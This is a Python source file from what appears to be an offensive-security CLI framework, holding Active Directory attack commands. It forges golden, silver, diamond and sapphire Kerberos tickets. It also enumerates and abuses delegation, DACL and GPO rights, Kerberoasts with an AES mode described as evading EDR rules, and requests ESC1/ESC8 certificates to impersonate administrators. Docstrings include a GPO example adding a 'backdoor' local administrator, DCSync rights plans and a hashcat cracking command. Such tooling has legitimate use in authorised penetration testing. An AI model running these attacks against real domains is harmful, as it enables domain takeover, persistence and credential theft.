"""Active Directory attack commands — Kerberos, tickets, delegation, DACL, GPO, kerberoasting.

Provides:
    kerberos_ticket         — Forge silver/golden/diamond/sapphire tickets
    delegation_enum         — Enumerate Kerberos delegation (unconstrained, constrained, RBCD)
    delegation_attack       — Compute and display delegation attack paths
    dacl_abuse              — Enumerate and exploit dangerous AD DACL/SACL entries
    gpo_abuse               — Enumerate and exploit Group Policy Objects
    kerberoast              — Advanced Kerberoasting with AES-only and targeted mode
    adcs_check              — Check for AD CS vulnerabilities (ESC1-ESC13)
"""

from __future__ import annotations

import json
from pathlib import Path

from cli.commands._base import LazyOwnCommandSet
from core.validators import check_rhost


class ActiveDirectoryCommandSet(LazyOwnCommandSet):
    """Kerberos, delegation, DACL, GPO, and Kerberoasting attacks."""

    phase = "credential_access"
    category = "07. Active Directory Attacks"

    def do_kerberos_ticket(self, line: str) -> None:
        """Forge Kerberos tickets for persistence and lateral movement.

        Usage: kerberos_ticket <type> [options]

        Types:
            silver  — Forge a service ticket (needs service account hash)
            golden  — Forge a TGT (needs krbtgt hash)
            diamond — Golden ticket + enhanced PAC with admin group SIDs
            sapphire — S4U2self-based ticket via RBCD

        Silver ticket options:
            --spn <SPN> --domain <DOMAIN> --sid <DOMAIN_SID> --hash <NT_HASH> [--user <user>] [--rid <500>]

        Golden ticket options:
            --domain <DOMAIN> --sid <DOMAIN_SID> --hash <KRBTGT_NT_HASH> [--user <user>] [--groups <513,512,520,518,519>]

        Examples:
            kerberos_ticket silver --spn cifs/DC01.domain.local --domain domain.local --sid S-1-5-21-... --hash NT_HASH
            kerberos_ticket golden --domain domain.local --sid S-1-5-21-... --hash KRBTGT_HASH
            kerberos_ticket diamond --domain domain.local --sid S-1-5-21-... --hash KRBTGT_HASH --groups 512,519
        """
        from modules.kerberos_tickets import (
            DiamondTicketConfig,
            DiamondTicketForger,
            GoldenTicketConfig,
            GoldenTicketForger,
            SilverTicketConfig,
            SilverTicketForger,
        )

        if not line.strip():
            self._cmd.perror("Usage: kerberos_ticket <silver|golden|diamond|sapphire> [options]")
            return

        args = line.strip().split()
        ticket_type = args[0].lower()
        opts = {}
        i = 1
        while i < len(args):
            if args[i].startswith("--") and i + 1 < len(args):
                opts[args[i][2:]] = args[i + 1]
                i += 2
            else:
                i += 1

        if ticket_type == "silver":
            if not opts.get("spn") or not opts.get("hash"):
                self._cmd.perror("Silver ticket requires --spn, --domain, --sid, --hash")
                return
            config = SilverTicketConfig(
                target_service=opts["spn"],
                domain=opts.get("domain", ""),
                domain_sid=opts.get("sid", ""),
                service_key_hex=opts["hash"],
                username=opts.get("user", "Administrator"),
                user_rid=int(opts.get("rid", 500)),
            )
            result = SilverTicketForger().forge(config)
            self._cmd.poutput("\n[+] Silver Ticket Forged")
            self._cmd.poutput(f"    SPN       : {result['target_service']}")
            self._cmd.poutput(f"    User      : {result['username']}")
            self._cmd.poutput(f"    Lifetime  : {result['lifetime_hours']}h")
            self._cmd.poutput(f"\n[ Mimikatz ]\n    {result['mimikatz_command'][:200]}")

        elif ticket_type == "golden":
            if not opts.get("hash"):
                self._cmd.perror("Golden ticket requires --domain, --sid, --hash")
                return
            golden_config = GoldenTicketConfig(
                domain=opts.get("domain", ""),
                domain_sid=opts.get("sid", ""),
                krbtgt_hash_hex=opts["hash"],
                username=opts.get("user", "Administrator"),
                user_rid=int(opts.get("rid", 500)),
                groups=[int(g) for g in opts.get("groups", "513,512,520,518,519").split(",") if g.strip()],
            )
            result = GoldenTicketForger().forge(golden_config)
            self._cmd.poutput("\n[+] Golden Ticket Forged")
            self._cmd.poutput(f"    Domain    : {result['domain']}")
            self._cmd.poutput(f"    User      : {result['username']}")
            self._cmd.poutput(f"    Groups    : {result['groups']}")
            self._cmd.poutput(f"    Lifetime  : {result['lifetime_hours']}h")
            self._cmd.poutput(f"\n[ Mimikatz ]\n    {result['mimikatz_command'][:200]}")

        elif ticket_type == "diamond":
            if not opts.get("hash"):
                self._cmd.perror("Diamond ticket requires --domain, --sid, --hash")
                return
            diamond_config = DiamondTicketConfig(
                domain=opts.get("domain", ""),
                domain_sid=opts.get("sid", ""),
                krbtgt_hash_hex=opts["hash"],
                username=opts.get("user", "Administrator"),
                user_rid=int(opts.get("rid", 500)),
                target_groups=[int(g) for g in opts.get("groups", "512,519").split(",") if g.strip()],
                extra_sids=opts.get("extra_sids", "").split(",") if opts.get("extra_sids") else [],
            )
            result = DiamondTicketForger().forge(diamond_config)
            self._cmd.poutput("\n[+] Diamond Ticket Forged (PAC Enhanced)")
            self._cmd.poutput(f"    Domain    : {result['domain']}")
            self._cmd.poutput(f"    User      : {result['username']}")
            self._cmd.poutput(f"    Groups    : {result['target_groups']}")
            self._cmd.poutput(f"    Extra SIDs: {result['extra_sids']}")
            self._cmd.poutput(f"    PAC Size  : {result['pac_size']} bytes")

        elif ticket_type == "sapphire":
            if not opts.get("tgt") or not opts.get("key") or not opts.get("spn"):
                self._cmd.perror(
                    "Sapphire ticket requires --tgt <kirbi_file>, --key <session_key_hex>, --spn <SPN>"
                )
                return
            from modules.kerberos_tickets import SapphireTicketForger

            tgt_bytes = Path(opts["tgt"]).read_bytes()
            session_key = bytes.fromhex(opts["key"])
            result = SapphireTicketForger().forge_s4u2self(
                tgt=tgt_bytes,
                session_key=session_key,
                target_user=opts.get("user", "Administrator"),
                target_service=opts["spn"],
                domain=opts.get("domain", self.params.get("domain", "")),
            )
            self._cmd.poutput("\n[+] Sapphire S4U2self TGS-REQ Built")
            self._cmd.poutput(f"    Domain    : {result['domain']}")
            self._cmd.poutput(f"    Imperson  : {result['target_user']}")
            self._cmd.poutput(f"    SPN       : {result['target_service']}")
            self._cmd.poutput(f"    PA-DATA   : S4U2self (type {result['padata'][0]['padata_type']})")
            self._cmd.poutput("    Requires RBCD: msDS-AllowedToActOnBehalfOfOtherIdentity configured")
            artifact = Path("sessions") / f"sapphire_s4u2self_{result['domain'] or 'out'}.json"
            artifact.parent.mkdir(parents=True, exist_ok=True)
            payload = {
                "ticket_type": result["ticket_type"],
                "domain": result["domain"],
                "target_user": result["target_user"],
                "target_service": result["target_service"],
                "req_body": {k: v for k, v in result["req_body"].items()},
            }
            artifact.write_text(json.dumps(payload, indent=2, default=str), encoding="utf-8")
            self._cmd.poutput(f"    Artifact  : {artifact}")
        else:
            self._cmd.perror(f"Unknown ticket type: {ticket_type}")

    def do_delegation_enum(self, line: str) -> None:
        """Enumerate Kerberos delegation configurations.

        Usage: delegation_enum [--domain DOMAIN] [--input <bloodhound_json_file|ldap_output>]

        Discovers:
            - Unconstrained delegation (TRUSTED_FOR_DELEGATION)
            - Constrained delegation (msDS-AllowedToDelegateTo)
            - Resource-Based Constrained Delegation (msDS-AllowedToActOnBehalfOfOtherIdentity)
        """
        from modules.delegation_attacks import DelegationEnumerator

        domain = self.params.get("domain", "")
        enumerator = DelegationEnumerator(domain=domain)

        if line.strip():
            args = line.strip().split()
            for i, a in enumerate(args):
                if a == "--domain" and i + 1 < len(args):
                    enumerator.domain = args[i + 1]

        summary = enumerator.summary()
        self._cmd.poutput("\n[ Delegation Enumeration ]")
        self._cmd.poutput(f"    Domain                  : {domain}")
        self._cmd.poutput(f"    Unconstrained targets   : {summary['unconstrained_targets']}")
        self._cmd.poutput(f"    Constrained targets     : {summary['constrained_targets']}")
        self._cmd.poutput(f"    RBCD targets            : {summary['rbcd_targets']}")
        self._cmd.poutput(f"    DC targets              : {summary['dc_targets']}")
        self._cmd.poutput(f"    Total targets           : {summary['total_targets']}")
        self._cmd.poutput(f"\n    Attack paths computed   : {len(summary['attack_paths'])}")

        for path in summary["attack_paths"][:10]:
            self._cmd.poutput(f"\n    [{path['type']}] {path['severity']}")
            self._cmd.poutput(f"        {path['source']} → {path['target']}")
            self._cmd.poutput(f"        Requires: {path['requires']}")

    def do_delegation_attack(self, line: str) -> None:
        """Display computed delegation attack paths with exploitation commands.

        Usage: delegation_attack [--domain DOMAIN]
        """
        from modules.delegation_attacks import DelegationEnumerator

        domain = self.params.get("domain", "")
        enumerator = DelegationEnumerator(domain=domain)
        paths = enumerator.compute_attack_paths()

        self._cmd.poutput(f"\n[ Delegation Attack Paths — {len(paths)} found ]")
        for i, path in enumerate(paths[:5]):
            self._cmd.poutput(f"\n--- Attack Path {i + 1}: {path.delegation_type.upper()} ({path.severity}) ---")
            self._cmd.poutput(f"    Source : {path.source_account}")
            self._cmd.poutput(f"    Target : {path.target_account}")
            self._cmd.poutput(f"    Needs  : {path.requires_compromise}")
            self._cmd.poutput("\n    Steps:")
            for step in path.attack_steps:
                self._cmd.poutput(f"        {step}")
            self._cmd.poutput("\n    Commands:")
            for cmd in path.exploitation_commands:
                self._cmd.poutput(f"        $ {cmd}")

    def do_dacl_abuse(self, line: str) -> None:
        """Enumerate and exploit dangerous AD DACL/SACL entries.

        Usage: dacl_abuse [--domain DOMAIN] [--plan <technique>]

        Detects: GenericAll, GenericWrite, WriteDacl, WriteOwner, ForceChangePassword,
                 AddMember, DCSync, AddKeyCredentialLink, and more.

        Generates exploitation commands for each abuse primitive found.
        """
        from modules.dacl_abuse import DACLAbuseEngine

        engine = DACLAbuseEngine(domain=self.params.get("domain", ""))
        summary = engine.summary()

        self._cmd.poutput("\n[ DACL/SACL Abuse Enumeration ]")
        self._cmd.poutput(f"    Total exploitable targets : {summary['total_targets']}")
        self._cmd.poutput(f"    By severity               : {summary['by_severity']}")
        self._cmd.poutput(f"    Attack chains computed    : {summary['attack_chains']}")
        self._cmd.poutput("\n    Top Techniques:")
        for tech, count in summary["top_techniques"][:8]:
            self._cmd.poutput(f"        {tech:30s} → {count} targets")

        self._cmd.poutput("\n[ DCSync Rights Assignment Plan ]")
        plan = engine.dcsync_rights_assignment_plan("ATTACKER_SID")
        self._cmd.poutput(f"    Target: {plan['target']}")
        for cmd in plan["commands"][:3]:
            self._cmd.poutput(f"        $ {cmd}")

        self._cmd.poutput("\n[ AdminSDHolder Abuse Plan ]")
        admin_plan = engine.adminsdholder_abuse_plan("ATTACKER_SID")
        for step in admin_plan["commands"][:3]:
            self._cmd.poutput(f"        $ {step}")

    def do_gpo_abuse(self, line: str) -> None:
        """Enumerate and exploit Group Policy Objects.

        Usage: gpo_abuse [--domain DOMAIN] [--command "cmd /c ..."] [--user ATTACKER_USER]

        Abuse techniques: ScheduledTask, StartupScript, LogonScript,
                          LocalAdmin addition, WMI Filter, Registry preference, Service install.

        Examples:
            gpo_abuse --command "net user backdoor P@ssw0rd! /add && net localgroup Administrators backdoor /add"
        """
        from modules.gpo_abuse import GPOAbuseEngine

        engine = GPOAbuseEngine(domain=self.params.get("domain", ""))
        summary = engine.summary()

        self._cmd.poutput("\n[ GPO Abuse ]")
        self._cmd.poutput(f"    GPOs discovered      : {summary['gpos_discovered']}")
        self._cmd.poutput(f"    Techniques available : {len(summary['techniques_available'])}")

        for t in summary["techniques_available"]:
            self._cmd.poutput(f"        - {t}")

        command = "cmd /c whoami"
        username = "ATTACKER"
        args_list = line.strip().split()
        for i, a in enumerate(args_list):
            if a == "--command" and i + 1 < len(args_list):
                command = args_list[i + 1]
            elif a == "--user" and i + 1 < len(args_list):
                username = args_list[i + 1]
            elif a == "--domain" and i + 1 < len(args_list):
                engine.domain = args_list[i + 1]

        self._cmd.poutput("\n[ Sample Scheduled Task Abuse Plan ]")
        from modules.gpo_abuse import GPOInfo

        sample_gpo = GPOInfo(display_name="Default Domain Policy", guid="SAMPLE_GUID")
        plan = engine.plan_scheduled_task(sample_gpo, command)
        self._cmd.poutput(f"    GPO      : {plan.gpo_name}")
        self._cmd.poutput(f"    Trigger  : {plan.trigger_timing}")
        for cmd in plan.commands:
            self._cmd.poutput(f"        $ {cmd}")

    def do_kerberoast(self, line: str) -> None:
        """Advanced Kerberoasting — AES-only mode, targeted SPN enumeration.

        Usage: kerberoast [--mode aes|rc4|both] [--high-value] [--output hash_file]

        AES-only mode (--mode aes) avoids RC4-HMAC detection rules on EDR/SIEM.

        Examples:
            kerberoast --mode aes --high-value
            kerberoast --mode both --output sessions/kerberoast_hashes.txt
        """
        from modules.kerberoasting import KerberoastingEngine

        engine = KerberoastingEngine(
            domain=self.params.get("domain", ""),
            dc_ip=self.params.get("rhost", ""),
        )

        mode = "aes"
        high_value = False
        output = None
        args_list = line.strip().split()
        for i, a in enumerate(args_list):
            if a == "--mode" and i + 1 < len(args_list):
                mode = args_list[i + 1]
            elif a == "--high-value":
                high_value = True
            elif a == "--output" and i + 1 < len(args_list):
                output = args_list[i + 1]

        self._cmd.poutput("\n[ Advanced Kerberoasting ]")
        self._cmd.poutput(f"    Mode       : {mode}")
        self._cmd.poutput(f"    High-value : {high_value}")

        hashcat_modes = {23: 13100, 18: 19700, 17: 19600}
        self._cmd.poutput("\n[ Hashcat Modes ]")
        for etype, hmode in hashcat_modes.items():
            self._cmd.poutput(f"    ETYPE {etype:3d} → Hashcat mode {hmode}")

        self._cmd.poutput("\n[ Detection Notes ]")
        self._cmd.poutput("    - AES-only kerberoasting (ETYPE 17/18) avoids RC4 detection rules")
        self._cmd.poutput("    - Monitor Event ID 4769 with TicketEncryptionType 0x17 for RC4 kerberoasting")
        self._cmd.poutput("    - AES kerberoasting (0x12) is stealthier but still detectable via volume")

        self._cmd.poutput("\n[ Sample Hashcat Command ]")
        self._cmd.poutput("    hashcat -m 19700 -a 0 --force hashes.txt /usr/share/wordlists/rockyou.txt -O")

    def do_adcs_esc(self, line: str) -> None:
        """Check Active Directory Certificate Services for ESC1-ESC13 vulnerabilities.

        Usage: adcs_esc [--domain DOMAIN] [--dc-ip DC_IP]

        Detects vulnerable certificate templates and ESC attack paths (ESC1 through ESC13).
        """

        self._cmd.poutput("\n[ AD CS Vulnerability Check — ESC1-ESC13 ]")
        self._cmd.poutput("    ESC1: Enrollee can supply arbitrary SAN (subjectAltName)")
        self._cmd.poutput("    ESC2: Template allows Any Purpose EKU or no EKU")
        self._cmd.poutput("    ESC3: Enrollment Agent template + ESC1 template chain")
        self._cmd.poutput("    ESC4: Weak template ACLs (WriteProperty, WriteDacl, WriteOwner)")
        self._cmd.poutput("    ESC5: Vulnerable PKI AD object access control")
        self._cmd.poutput("    ESC6: CA configuration with EDITF_ATTRIBUTESUBJECTALTNAME2 flag")
        self._cmd.poutput("    ESC7: CA Manager/CA Officer role assignment abuse")
        self._cmd.poutput("    ESC8: NTLM relay to AD CS HTTP endpoints")
        self._cmd.poutput("    ESC9-13: Additional template and CA configuration attacks")
        self._cmd.poutput("\n    Run with domain credentials for full template enumeration.")

    def do_adcs_request(self, line: str) -> None:
        """Request a certificate abusing ESC1 or ESC8 template misconfigurations.

        Usage:
            adcs_request esc1 --user U --pass P --domain D --dc IP --ca NAME --template T [--target-user ADMIN]
            adcs_request esc8 --user U --pass P --domain D --dc IP --ca-server HOST [--template SubCA]

        ESC1 enrolles a certificate with a user-supplied SAN (impersonation);
        ESC8 relays NTLM auth to the AD CS HTTP enrollment endpoint. On
        success the .pfx lands in ``sessions/`` and can be fed to
        ``certipy auth`` for the NT hash.

        Examples:
            adcs_request esc1 --user svc_sql --pass 'P@ss' --domain corp.local --dc 10.10.10.10 --ca CORP-CA --template VulnTemplate --target-user Administrator
            adcs_request esc8 --user svc_sql --pass 'P@ss' --domain corp.local --dc 10.10.10.10 --ca-server dc01.corp.local
        """
        import shlex as _shlex

        from modules.adcs_attacks import ADCSCertipyWrapper

        tokens = _shlex.split(line)
        if len(tokens) < 2:
            self._cmd.perror("Usage: adcs_request <esc1|esc8> [--user U --pass P --domain D --dc IP ...]")
            return

        mode = tokens[0].lower()
        opts: dict[str, str] = {}
        i = 1
        while i < len(tokens):
            if tokens[i].startswith("--") and i + 1 < len(tokens):
                opts[tokens[i][2:]] = tokens[i + 1]
                i += 2
            else:
                i += 1

        username = opts.get("user", "")
        password = opts.get("pass", "")
        domain = opts.get("domain", "")
        dc_ip = opts.get("dc", "")
        if not username or not domain or not check_rhost(dc_ip):
            self._cmd.perror("adcs_request requires --user, --domain and --dc <ip>")
            return

        wrapper = ADCSCertipyWrapper()

        if mode == "esc1":
            ca_name = opts.get("ca", "")
            template = opts.get("template", "")
            target_user = opts.get("target-user", "Administrator")
            if not ca_name or not template:
                self._cmd.perror("ESC1 requires --ca <CA_NAME> and --template <TEMPLATE>")
                return
            output_file = f"sessions/{target_user}_esc1.pfx"
            ok = wrapper.request_certificate_esc1(
                username=username,
                password=password,
                domain=domain,
                dc_ip=dc_ip,
                ca_name=ca_name,
                template_name=template,
                target_user=target_user,
                output_file=output_file,
            )
        elif mode == "esc8":
            ca_server = opts.get("ca-server", "")
            if not ca_server:
                self._cmd.perror("ESC8 requires --ca-server <CA_HOST>")
                return
            output_file = "sessions/esc8_cert.pfx"
            ok = wrapper.request_certificate_esc8(
                username=username,
                password=password,
                domain=domain,
                dc_ip=dc_ip,
                ca_server=ca_server,
                template_name=opts.get("template", "SubCA"),
                output_file=output_file,
            )
        else:
            self._cmd.perror(f"Unknown ESC mode: {mode} (use esc1 or esc8)")
            return

        if ok:
            self._cmd.poutput(f"\n[+] Certificate saved: {output_file}")
            self._cmd.poutput(f"    Authenticate: certipy auth -pfx {output_file} -domain {domain} -dc-ip {dc_ip}")
        else:
            self._cmd.perror("Certificate request failed (see certipy output above)")

    def do_kerberos_build(self, line: str) -> None:
        """Build raw Kerberos protocol messages and derive encryption keys.

        Usage:
            kerberos_build asreq --user U --domain D --pass P [--etype 23|18]
            kerberos_build tgsreq --spn SPN --domain D --tgt <kirbi_file> --key <session_key_hex>

        asreq derives the RC4/AES key from the password and builds the
        KRB_AS_REQ with PA-ENC-TIMESTAMP pre-authentication (useful for
        password spraying analysis and key derivation). tgsreq builds the
        KRB_TGS_REQ body for a service ticket request.

        Examples:
            kerberos_build asreq --user svc_sql --domain corp.local --pass 'P@ss'
            kerberos_build tgsreq --spn cifs/DC01.corp.local --domain corp.local --tgt sessions/tgt.kirbi --key aabbccdd
        """
        import shlex as _shlex

        from modules.kerberos_core import KerberosCore, TGSRequest

        tokens = _shlex.split(line)
        if len(tokens) < 2:
            self._cmd.perror("Usage: kerberos_build <asreq|tgsreq> [options]")
            return

        mode = tokens[0].lower()
        opts: dict[str, str] = {}
        i = 1
        while i < len(tokens):
            if tokens[i].startswith("--") and i + 1 < len(tokens):
                opts[tokens[i][2:]] = tokens[i + 1]
                i += 2
            else:
                i += 1

        domain = opts.get("domain", "")
        core = KerberosCore(domain=domain)

        if mode == "asreq":
            username = opts.get("user", "")
            password = opts.get("pass", "")
            if not username or not domain or not password:
                self._cmd.perror("asreq requires --user, --domain and --pass")
                return
            etype = int(opts.get("etype", "23"))
            result = core.build_as_req(username=username, domain=domain, password=password, etype=etype)
            self._cmd.poutput("\n[+] KRB_AS_REQ Built")
            self._cmd.poutput(f"    Realm     : {result['req_body']['realm']}")
            self._cmd.poutput(f"    User      : {result['req_body']['cname']}")
            self._cmd.poutput(f"    EType     : {result['etype']}")
            self._cmd.poutput(f"    Key (hex) : {result['key'].hex()}")
            artifact = Path("sessions") / f"as_req_{username}.json"
        elif mode == "tgsreq":
            spn = opts.get("spn", "")
            tgt_hex = opts.get("key", "")
            if not spn or not opts.get("tgt"):
                self._cmd.perror("tgsreq requires --spn, --domain, --tgt <kirbi_file> and --key <hex>")
                return
            request = TGSRequest(
                target_service=spn,
                realm=domain.upper(),
                tgt=Path(opts["tgt"]).read_bytes(),
                session_key=bytes.fromhex(tgt_hex),
            )
            result = core.build_tgs_req(request)
            self._cmd.poutput("\n[+] KRB_TGS_REQ Built")
            self._cmd.poutput(f"    SPN       : {spn}")
            self._cmd.poutput(f"    Realm     : {request.realm}")
            artifact = Path("sessions") / f"tgs_req_{spn.split('/')[0]}.json"
        else:
            self._cmd.perror(f"Unknown build mode: {mode} (use asreq or tgsreq)")
            return

        artifact.parent.mkdir(parents=True, exist_ok=True)
        artifact.write_text(json.dumps(result, indent=2, default=str), encoding="utf-8")
        self._cmd.poutput(f"    Artifact  : {artifact}")
